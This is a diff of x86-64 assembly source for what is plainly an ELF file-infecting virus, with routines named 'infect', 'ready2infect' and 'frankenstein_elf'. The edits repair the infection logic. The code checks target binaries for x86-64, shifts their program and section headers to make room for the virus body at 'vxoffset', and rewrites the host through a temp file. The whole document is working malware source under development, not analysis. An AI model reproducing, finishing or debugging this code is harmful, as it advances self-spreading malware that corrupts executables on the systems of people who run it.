@@ -488,23 +488,11 @@ check_file:
 		;lea r13, [r14 + 200]
 		;call _write
 		xor rax, rax
-;		mov [r14 + 500], rax				;save fd to opened file at designated spot on the stack
-	
 		push r9
 	check_filename:
 		cmp qword [r14+200], "."
 		je checknext
 
-;	read_elf_header:
-		;mov rdi, [fd]
-;		mov rdi, r9
-	;	lea rsi, [elf_header]
-;		lea rsi, [r14 + elf_ehdr]
-;		mov rdx, 64
-;		xor r10, r10
-;		mov rax, SYS_PREAD64
-;		syscall
-	
 	get_filestat:
 									;size for mmap == e_shoff + (e_shnum * e_shentsize)
 		lea rsi, [r14 + filestat]	;or retrieve size from filestat struct with an fstat syscall
@@ -514,10 +502,6 @@ check_file:
 
 		;tbqf extracting this field and checking it is an infuriating piece of logic that is not working as expected
 		; since this is so annoying, I'm skipping this check for rn
-	
-		;mov r12, checkfiledtreg_fail_len
-		;lea r13, checkfile_dtreg_fail
-		
 		;mov r10, [r14 + file_stat.st_mode]
 		;mov [mode], r10
 		;mov r10, S_ISREG(r10)
@@ -527,10 +511,10 @@ check_file:
 		;and r10, [S_IFMT]
 		;mov r9, [S_IFREG]
 		;cmp r10, r9
-		
-		
 		;jne checknext
-		
+	
+
+	
 		;void *mmap(void addr[.length], size_t length, int prot, int flags,
 		;                  int fd, off_t offset);
 	mmap_file:
@@ -592,16 +576,13 @@ check_file:
 		;lea r13, check64pass
 		;mov r12, check64passlen
 		;call _write
-		jmp ready2infect
+		;jmp ready2infect
 	
 	check_elf_header_arch:
 		lea r13, checkarchfail
 		mov r12, checkarchfaillen
-		;cmp byte [elf_header+18], 0x3e
-		;cmp byte [rax + elf_ehdr +18], 0x3e
-		cmp byte [r14+800+elf_ehdr + 18], ELFX8664
-		;cmp byte [rax + elf_ehdr.e_machine], 0x3e
-		;cmp word [rax + elf_ehdr.e_machine], 0x03e
+		;cmp byte [r14+800+elf_ehdr + 18], ELFX8664
+		cmp byte [rax + elf_ehdr.e_machine], 0x3e
 		jne checknext
 		
 		;debug print check
@@ -610,12 +591,8 @@ check_file:
 		;call _write
 		
 	ready2infect:
-		push rax
-		;mov [r14 + 0xa00], rax
 		call infect	
 		jmp painting
-
-
 
 	checknext:
 		;mov r12, checkfiledtreg_fail_len
@@ -633,7 +610,6 @@ check_file:
 		cmp qword rcx, [r14 + 500]
 		jne check_file
 		jmp _restore
-
 
 
 
@@ -719,14 +695,7 @@ payload:
 ;****************************************************************************************
 
 infect:
-;	sub rsp, 0x8
-	;push rbp
-	;mov rbp, rsp
-;	lea r13, [rax + elf_ehdr]
-	;;mov r13, rax
 	mov r13, [r14+ 800]				;location on stack where we saved address returned from mmap syscall
-	;jmp frankenstein_elf
-	;mov r12, rax
 	mov r12, [r13 + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
 	mov r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
 	mov rdx, checkphdrstartlen
@@ -738,6 +707,7 @@ infect:
 	
 ;;	mov qword r11, [rax + elf_ehdr.e_entry] ;save original host file entry point for jmp in vx code
 ;;	mov qword [vxhostentry], r11
+
 ;****************************************************************************************
 ;	Update program headers of infected ELF
 ;
@@ -752,7 +722,6 @@ infect:
 ;
 ;****************************************************************************************
 	xor rcx, rcx
-;	xor rdx, rdx
 	mov word cx, [r13 + elf_ehdr.e_phnum]
 	check_phdrs:
 		;push rdx
@@ -786,30 +755,28 @@ infect:
 				syscall
 				add dword [r13 + r12 + elf_phdr.p_offset], PAGESIZE
 		.next_phdr:
-	;		inc dx
-	;		pop rdx 
 			dec cx 
 			add r12w, word [r13 + elf_ehdr.e_phentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
-			;cmp dx, word [r13 + elf_ehdr.e_phnum]
 			cmp cx, 0
 			jg .phdr_loop
-	;		jl .phdr_loop
 			;jg check_shdrs
 	jmp frankenstein_elf
+	;jg check_shdrs
 ;****************************************************************************************
 ;	Now update section headers of infected ELF
 ;****************************************************************************************
 
-	mov rdx, [rax + elf_ehdr.e_shentsize]
+	xor rdx, rdx
+	mov dx, word [r13 + elf_ehdr.e_shentsize]
 	xor r11, r11
 	xor rcx, rcx
 	check_shdrs:
 		push rcx
 		.shdr_loop:
-			cmp qword [r15 + elf_shdr.sh_offset], vxoffset
+			cmp qword [r13 + r15 + elf_shdr.sh_offset], vxoffset
 			jge .mod_subsequent_shdr
-			mov r11, [r15 + elf_shdr.sh_addr]
-			add r11, [r15 + elf_shdr.sh_size]
+			mov r11, [r13 + r15 + elf_shdr.sh_addr]
+			add r11, [r13 + r15 + elf_shdr.sh_size]
 			cmp r10, r11
 			jne .mod_subsequent_shdr
 			add qword [r15 + elf_shdr.sh_size], vlen
@@ -888,9 +855,11 @@ frankenstein_elf:
 	mov rdi, rax
 
 	;write ELF header to temp file
+	;actually just write the first 1024 bytes of target ELF to temp file
 
-	mov rdx, 512
+	;mov rdx, 512
 	;mov rdx, 64
+	mov rdx, 1024
 	mov rsi, r13					;r13 contains pointer to mmap'd file
 	mov rax, SYS_WRITE
 	syscall
